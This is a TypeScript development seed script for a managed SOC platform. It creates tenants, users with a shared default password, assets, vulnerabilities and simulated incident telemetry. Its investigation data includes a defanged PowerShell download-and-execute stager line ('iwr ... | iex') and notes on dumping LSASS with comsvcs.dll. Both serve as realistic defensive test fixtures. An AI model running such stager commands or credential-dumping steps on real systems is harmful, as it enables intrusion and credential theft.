const SENSORS: Record<string, string> = { "kilimanjaro-bank": "zeek-kb-core01", "savannah-logistics": "zeek-sl-hq", "nile-health": "zeek-nh-core" };

// ─── HTTP helpers (the seed drives the real API) ────────────────────────────

class Client {
  constructor(
    private readonly app: FastifyInstance,
    private token: string | null = null,
  ) {}

  setToken(token: string): void {
    this.token = token;
  }

  async call<T = Record<string, unknown>>(method: "GET" | "POST" | "PATCH" | "DELETE", url: string, payload?: unknown, okStatuses: number[] = [200, 201, 202, 204]): Promise<{ status: number; body: T }> {
    const res = await this.app.inject({
      method,
      url: `/api/v1${url}`,
      headers: { ...(this.token ? { authorization: `Bearer ${this.token}` } : {}), "user-agent": "bloody-dev-seed" },
      ...(payload !== undefined ? { payload: payload as Record<string, unknown> } : {}),
    });
    const body = (res.body ? JSON.parse(res.body) : {}) as T;
    if (!okStatuses.includes(res.statusCode)) throw new Error(`${method} ${url} → ${res.statusCode}: ${res.body.slice(0, 500)}`);
    return { status: res.statusCode, body };
  }
}

interface Page<T> {
  items: T[];
}

// ─── Main ───────────────────────────────────────────────────────────────────

async function main(): Promise<void> {
  const config = loadConfig({ ...process.env, LOG_LEVEL: process.env.LOG_LEVEL ?? "warn" });
  if (config.env === "production") throw new Error("seed-dev refuses to run with NODE_ENV=production");
  const refresh = process.argv.includes("--refresh");
  const password = process.env.SEED_ADMIN_PASSWORD ?? "ChangeMe!123";

  console.log("bloody seed-dev: applying migrations…");
  await migrate({ connectionString: config.database.privilegedUrl, appRolePassword: config.database.appPassword });

  const privileged = createPool({ connectionString: config.database.privilegedUrl, applicationName: "bloody-seed" });
  const appPool = createPool({ connectionString: config.database.appUrl, applicationName: "bloody-seed-app" });
  const db = new Database(appPool, privileged);
  let built: BuiltApp | null = null;
  try {
    // 1. Bootstrap the tenant and its first administrator (the only privileged writes).
    const hash = await hashPassword(password);
    const tenantId = await db.withPrivileged(async (tx) => {
      const acc = await tx.query<{ id: string }>(
        `INSERT INTO accounts (name, slug, kind, plan, data_region) VALUES ('Dorisec Africa', 'dorisec-africa', 'mssp', 'mssp', 'af-south')
         ON CONFLICT (slug) DO UPDATE SET name = EXCLUDED.name, kind = 'mssp', plan = 'mssp' RETURNING id`,
      );
      const id = acc.rows[0]!.id;
      const user = await tx.query<{ id: string }>(
        `INSERT INTO users (tenant_id, email, display_name, title, status) VALUES ($1, 'admin@bloody.local', 'Dorisec Platform Admin', 'MSSP Administrator', 'active')
         ON CONFLICT (tenant_id, email) DO UPDATE SET status = 'active' RETURNING id`,
        [id],
      );
      const uid = user.rows[0]!.id;
      await tx.query(
        `INSERT INTO user_credentials (user_id, tenant_id, password_hash) VALUES ($1, $2, $3)
         ON CONFLICT (user_id) DO UPDATE SET password_hash = EXCLUDED.password_hash`,
        [uid, id, hash],
      );
      await tx.query("UPDATE users SET failed_login_count = 0, locked_until = NULL WHERE id = $1", [uid]);
      await tx.query(
        `INSERT INTO role_bindings (tenant_id, principal_kind, principal_id, role, organization_id) VALUES ($1, 'user', $2, 'mssp_admin', NULL)
         ON CONFLICT (tenant_id, principal_kind, principal_id, role, org_key(organization_id)) DO NOTHING`,
        [id, uid],
      );
      return id;
    });

    // Scenario anchor (stable across runs unless --refresh).
    const anchor = await db.withPrivileged(async (tx) => {
      const { rows } = await tx.query<{ anchor: string | null }>("SELECT settings->'seed'->>'anchor' AS anchor FROM accounts WHERE id = $1", [tenantId]);
      const existing = rows[0]?.anchor ?? null;
      if (existing && !refresh && Date.now() - Date.parse(existing) < 300 * 86_400_000) return existing;
      const next = new Date(Math.floor(Date.now() / 60_000) * 60_000).toISOString();
      await tx.query("UPDATE accounts SET settings = jsonb_set(settings, '{seed}', jsonb_build_object('anchor', $2::text, 'version', 1)) WHERE id = $1", [tenantId, next]);
      return next;
    });
    const anchorMs = Date.parse(anchor);
    const ctx: ScenarioCtx = { at: (minutes, seconds = 0) => new Date(anchorMs - minutes * 60_000 + seconds * 1000).toISOString() };

    // 2. Everything else goes through the API as the MSSP administrator.
    built = await buildApp({ config, db, startPipeline: true });
    const { app, services } = built;
    await app.ready();
    const api = new Client(app);
    const login = await api.call<{ token: string }>("POST", "/auth/login", { email: "admin@bloody.local", password });
    api.setToken(login.body.token);

    const orgIds = new Map<string, string>();
    const existingOrgs = (await api.call<Page<{ id: string; slug: string }>>("GET", "/organizations?limit=500")).body.items;
    for (const o of ORGS) {
      const found = existingOrgs.find((x) => x.slug === o.slug);
      if (found) {
        await api.call("PATCH", `/organizations/${found.id}`, { name: o.name, plan: o.plan, mrr: o.mrr, industry: o.industry, retentionDays: o.retentionDays });
        orgIds.set(o.slug, found.id);
      } else {
        const created = await api.call<{ id: string }>("POST", "/organizations", { name: o.name, slug: o.slug, plan: o.plan, mrr: o.mrr, industry: o.industry, retentionDays: o.retentionDays });
        orgIds.set(o.slug, created.body.id);
      }
    }
    const kb = orgIds.get("kilimanjaro-bank")!;
    const sl = orgIds.get("savannah-logistics")!;
    const nh = orgIds.get("nile-health")!;

    // Staff and customer users.
    const people = [
      { email: "analyst.t1@bloody.local", displayName: "Neema Tier-1 Analyst", title: "SOC Analyst (Tier 1)", roles: [{ role: "soc_analyst_t1", organizationId: null }] },
      { email: "analyst.t2@bloody.local", displayName: "Baraka Tier-2 Analyst", title: "SOC Analyst (Tier 2)", roles: [{ role: "soc_analyst_t2", organizationId: null }] },
      { email: "hunter@bloody.local", displayName: "Zawadi Threat Hunter", title: "Threat Hunter", roles: [{ role: "threat_hunter", organizationId: null }] },
      { email: "responder@bloody.local", displayName: "Tumaini Incident Responder", title: "Incident Responder", roles: [{ role: "incident_responder", organizationId: null }] },
      { email: "engineer@bloody.local", displayName: "Imani Security Engineer", title: "Detection Engineer", roles: [{ role: "security_engineer", organizationId: null }] },
      { email: "pod.kb@bloody.local", displayName: "Kilimanjaro Pod Analyst", title: "Dedicated analyst — Kilimanjaro Bank", roles: [{ role: "soc_analyst_t2", organizationId: kb }] },
      { email: "ciso@kilimanjaro-bank.example", displayName: "Rehema Ngowi", title: "CISO, Kilimanjaro Bank", organizationId: kb, roles: [{ role: "ciso", organizationId: kb }] },
      { email: "it.manager@savannah-logistics.example", displayName: "Alice Otieno", title: "IT Manager, Savannah Logistics", organizationId: sl, roles: [{ role: "org_admin", organizationId: sl }] },
      { email: "viewer@nile-health.example", displayName: "Nile Health Security Contact", title: "Practice Manager", organizationId: nh, roles: [{ role: "customer_viewer", organizationId: nh }] },
    ];
    const userIds = new Map<string, string>();
    for (const person of people) {
      const res = await api.call<{ id: string }>("POST", "/users", { ...person, password }, [201, 409]);
      if (res.status === 201) userIds.set(person.email, res.body.id);
      else {
        const found = (await api.call<Page<{ id: string; email: string }>>("GET", `/users?q=${encodeURIComponent(person.email)}`)).body.items.find((u) => u.email === person.email);
        if (found) {
          userIds.set(person.email, found.id);
          await api.call("POST", `/users/${found.id}/password`, { password });
        }
      }
    }

    // A dedicated customer pod team.
    const teams = (await api.call<Page<{ id: string; name: string }>>("GET", "/teams")).body.items;
    let pod = teams.find((t) => t.name === "East Africa SOC Pod");
    if (!pod) pod = (await api.call<{ id: string; name: string }>("POST", "/teams", { name: "East Africa SOC Pod", description: "Follow-the-sun analysts for East African customers" })).body;
    for (const email of ["analyst.t1@bloody.local", "analyst.t2@bloody.local", "responder@bloody.local"]) {
      const uid = userIds.get(email);
      if (uid) await api.call("POST", `/teams/${pod.id}/members`, { userId: uid, memberRole: email.includes("t2") ? "lead" : "member" });
    }

    // 3. Inventory per organization.
    const assetIds = new Map<string, string>();
    for (const o of ORGS) {
      const orgId = orgIds.get(o.slug)!;
      for (const a of o.assets) {
        const res = await api.call<{ id: string }>(
          "POST",
          "/assets",
          { organizationId: orgId, kind: a.kind, name: a.name, hostname: a.host, ipAddresses: a.ip, os: a.os, criticality: a.criticality, internetFacing: a.internetFacing ?? false, tags: a.tags ?? [], owner: a.owner ?? null },
          [201, 409],
        );
        let id = res.status === 201 ? res.body.id : null;
        if (!id) {
          const found = (await api.call<Page<{ id: string; hostname: string | null }>>("GET", `/assets?organizationId=${orgId}&q=${encodeURIComponent(a.host)}`)).body.items.find((x) => x.hostname?.toLowerCase() === a.host);
          id = found?.id ?? null;
          if (id) await api.call("PATCH", `/assets/${id}`, { name: a.name, kind: a.kind, criticality: a.criticality, internetFacing: a.internetFacing ?? false, tags: a.tags ?? [], os: a.os, ipAddresses: a.ip });
        }
        if (id) assetIds.set(a.host, id);
        if (a.agent) {
          const checkin = new Date(Date.now() - (a.agent.lastCheckinHoursAgo ?? 0.05) * 3_600_000).toISOString();
          await api.call("POST", "/agents", {
            organizationId: orgId,
            hostname: a.host,
            platform: a.agent.platform,
            version: a.agent.version,
            engine: "wazuh",
            status: a.agent.status,
            antivirusStatus: a.agent.av,
            firewallEnabled: a.agent.firewall,
            lastCheckinAt: checkin,
            os: a.os,
            ipAddresses: a.ip.filter((ip) => ip.startsWith("10.")),
          });
        }
      }
      for (const i of o.identities) {
        await api.call("POST", "/identities", {
          organizationId: orgId,
          kind: i.kind ?? "user",
          provider: i.provider,
          principal: i.principal,
          displayName: i.displayName,
          privileged: i.privileged ?? false,
          mfaEnabled: i.mfa ?? false,
          lastActivityAt: new Date(Date.now() - (i.lastActivityDaysAgo ?? 1) * 86_400_000).toISOString(),
        });
      }
    }

    // Vulnerabilities, reachability, privileged access and the threat-intel feed go through the
    // inventory service (their dedicated APIs belong to the exposure / CTI modules).
    await services.db.withTenant(tenantId, async (tx) => {
      for (const o of ORGS) {
        for (const v of o.vulns) {
          const assetId = assetIds.get(v.host);
          if (!assetId) continue;
          await services.inventory.upsertVulnerability(tx, tenantId, {
            assetId,
            cve: v.cve,
            title: v.title,
            cvss: v.cvss,
            epss: v.epss,
            knownExploited: v.kev,
            patchAvailable: v.patch,
            source: v.kev ? "greenbone+cisa-kev" : "greenbone",
            firstSeenAt: new Date(anchorMs - v.firstSeenDaysAgo * 86_400_000).toISOString(),
          });
        }
        for (const [from, targets] of o.reach) {
          const fromId = assetIds.get(from);
          if (fromId) await services.inventory.setReachability(tx, tenantId, fromId, targets.map((t) => assetIds.get(t)).filter((x): x is string => !!x));
        }
        const orgId = orgIds.get(o.slug)!;
        for (const [key, grants] of o.access) {
          const [provider, principal] = [key.slice(0, key.indexOf(":")), key.slice(key.indexOf(":") + 1)];
          const { rows } = await tx.query<{ id: string }>("SELECT id FROM identities WHERE organization_id = $1 AND lower(provider) = $2 AND lower(principal) = $3", [orgId, provider, principal.toLowerCase()]);
          const identityId = rows[0]?.id;
          if (!identityId) continue;
          await services.inventory.setIdentityAccess(tx, tenantId, identityId, grants.map((g) => ({ assetId: assetIds.get(g.host)!, level: g.level })).filter((g) => g.assetId));
          await services.inventory.scoreIdentity(tx, tenantId, identityId);
        }
      }
      for (const ind of INDICATORS) {
        await services.inventory.upsertIndicator(tx, tenantId, { organizationId: null, ...ind, firstSeenAt: new Date(anchorMs - 20 * 86_400_000).toISOString(), lastSeenAt: new Date(anchorMs - 86_400_000).toISOString() });
      }
    });
    services.attackPaths.invalidate(tenantId);

    // Organization-bound ingestion keys for the Wazuh managers (created once; shown once).
    const keys = (await api.call<Page<{ name: string; organizationId: string | null; active: boolean }>>("GET", "/api-keys")).body.items;
    const newKeys: Array<{ org: string; key: string }> = [];
    for (const o of ORGS) {
      const name = `Wazuh manager — ${o.name}`;
      if (keys.some((k) => k.name === name && k.active)) continue;
      const res = await api.call<{ key: string }>("POST", "/api-keys", { name, organizationId: orgIds.get(o.slug), roles: ["api_service"] });
      newKeys.push({ org: o.name, key: res.body.key });
    }

    // 4. Telemetry through the real ingest API → bus → analytics pipeline.
    let accepted = 0;
    let duplicates = 0;
    for (const o of ORGS) {
      const orgId = orgIds.get(o.slug)!;
      const events = [...backgroundNoise(o, ctx, SENSORS[o.slug]!), ...o.scenario(ctx)].sort((a, b) => a.timestamp.localeCompare(b.timestamp));
      const batch: IngestEvent[] = events.map(({ key, ...e }) => ({
        ...e,
        id: uuidV5(`bloody-dev-seed:${tenantId}:${o.slug}:${anchor}:${key}`),
        provenance: { adapter: "bloody-dev-seed", adapterVersion: "1", receivedAt: new Date(Math.min(Date.parse(e.timestamp) + 4_000, Date.now())).toISOString() },
      }));
      for (let i = 0; i < batch.length; i += 2000) {
        const res = await api.call<{ accepted: number; duplicates: number; rejectedCount: number; rejected: unknown[] }>("POST", "/ingest/events", { organizationId: orgId, events: batch.slice(i, i + 2000) });
        accepted += res.body.accepted;
        duplicates += res.body.duplicates;
        if (res.body.rejectedCount > 0) console.warn(`  ${o.slug}: ${res.body.rejectedCount} events rejected`, JSON.stringify(res.body.rejected.slice(0, 3)));
      }
    }
    await services.bus.drain();

    // 5. Analyst work on the produced incidents (only once per incident).
    const t2 = userIds.get("analyst.t2@bloody.local");
    const critical = (await api.call<Page<{ id: string; number: number; organizationId: string; title: string; status: string }>>("GET", `/incidents?organizationId=${kb}&severity=critical&status=active`)).body.items[0];
    if (critical) {
      const invs = (await api.call<Page<{ id: string }>>("GET", `/investigations?incidentId=${critical.id}`)).body.items;
      if (invs.length === 0) {
        if (t2) await api.call("PATCH", `/incidents/${critical.id}`, { assigneeId: t2 });
        const inv = (
          await api.call<{ id: string }>("POST", "/investigations", {
            incidentId: critical.id,
            title: `Credential theft on kb-ws-fin07 (incident #${critical.number})`,
            hypothesis: "Malicious Word document executed a PowerShell stager, beaconed to TA-AFR-07 infrastructure and dumped LSASS to harvest domain credentials.",
            ...(t2 ? { leadId: t2 } : {}),
          })
        ).body;
        await api.call("POST", `/investigations/${inv.id}/notes`, { body: "Confirmed comsvcs.dll MiniDump against LSASS (PID 652). Treat every credential cached on kb-ws-fin07 as compromised; requesting isolation approval.", visibility: "internal" });
        await api.call("POST", `/investigations/${inv.id}/tasks`, { title: "Reset passwords for accounts cached on kb-ws-fin07", ...(t2 ? { assigneeId: t2 } : {}), dueAt: new Date(Date.now() + 4 * 3_600_000).toISOString() });
        await api.call("POST", `/investigations/${inv.id}/tasks`, { title: "Block 198.51.100.23 and cdn-telemetry.update-check.example at the perimeter" });
        await api.call("POST", `/investigations/${inv.id}/evidence`, {
          name: "kb-ws-fin07 LSASS minidump (Velociraptor collection)",
          kind: "memory",
          sha256: sha256Hex("bloody-dev-seed:kb-ws-fin07:lsass-minidump"),
          sizeBytes: 48_234_496,
          storageRef: "velociraptor://C.4f1e2a9b7c3d/F.CQ2M8K1N/lsass.dmp",
          tags: ["memory", "credential-access"],
          note: "Collected by Windows.Memory.ProcessDump artifact",
        });
        await api.call("POST", `/investigations/${inv.id}/evidence`, {
          name: "PowerShell stager (inv.ps1)",
          kind: "file",
          contentBase64: Buffer.from("# Defanged sample: iwr hxxp://198.51.100[.]23/inv.ps1 | iex\n").toString("base64"),
          tags: ["stager"],
        });
      }
    }
    const savIncident = (await api.call<Page<{ id: string; number: number }>>("GET", `/incidents?organizationId=${sl}&status=active&sort=severity`)).body.items[0];
    if (savIncident) {
      const open = (await api.call<Page<{ id: string }>>("GET", `/escalations?incidentId=${savIncident.id}&status=open,acknowledged`)).body.items;
      if (open.length === 0) {
        await api.call("POST", "/escalations", {
          incidentId: savIncident.id,
          title: "Customer action: reset j.mwangi credentials and revoke Super Administrator role",
          reason: "Brute force succeeded from 203.0.113.66 followed by a privileged role assignment; Okta admin access is required on the customer side.",
          severity: "high",
          dueInMinutes: 60,
        });
      }
    }

    // 6. Report.
    const summary = await api.call<Record<string, unknown>>("GET", "/command-center/summary?windowDays=30");
    const s = summary.body as {
      activeIncidents: { total: number; critical: number; high: number };
      socActions: { eventsAnalyzed: number; signalsGenerated: number };
      escalations: { open: number };
      intelMatches: number;
      attackPaths: { total: number; toCrownJewels: number };
      exposureScore: number;
    };
    console.log("");
    console.log("Bloody development seed complete");
    console.log("────────────────────────────────");
    console.log(`Tenant              Dorisec Africa (mssp)  ${tenantId}`);
    for (const o of ORGS) console.log(`Organization        ${o.name.padEnd(22)} ${orgIds.get(o.slug)}`);
    console.log(`Scenario anchor     ${anchor}${refresh ? " (refreshed)" : ""}`);
    console.log(`Events ingested     ${accepted} new, ${duplicates} already present`);
    console.log(`Command Center      ${s.activeIncidents.total} active incidents (${s.activeIncidents.critical} critical, ${s.activeIncidents.high} high), ${s.socActions.signalsGenerated} signals from ${s.socActions.eventsAnalyzed} events, ${s.escalations.open} open escalations, ${s.intelMatches} intel matches, ${s.attackPaths.total} attack paths (${s.attackPaths.toCrownJewels} to crown jewels), exposure ${s.exposureScore}/100`);
    console.log("");
    console.log("Sign in (development only):");
    console.log(`  admin@bloody.local / ${password}   (MSSP admin; also analyst.t1@, analyst.t2@, hunter@, responder@, engineer@, pod.kb@bloody.local)`);
    console.log(`  ciso@kilimanjaro-bank.example, it.manager@savannah-logistics.example, viewer@nile-health.example — same password`);
    for (const k of newKeys) console.log(`  Ingestion API key for ${k.org}: ${k.key}`);
    if (newKeys.length === 0) console.log("  (organization ingestion API keys already exist — create new ones under Settings → API credentials)");
  } finally {
    if (built) await built.app.close();
    await db.close();
  }
}

main().catch((err: unknown) => {
  console.error(`seed-dev failed: ${err instanceof Error ? (err.stack ?? err.message) : String(err)}`);
  process.exit(1);
});
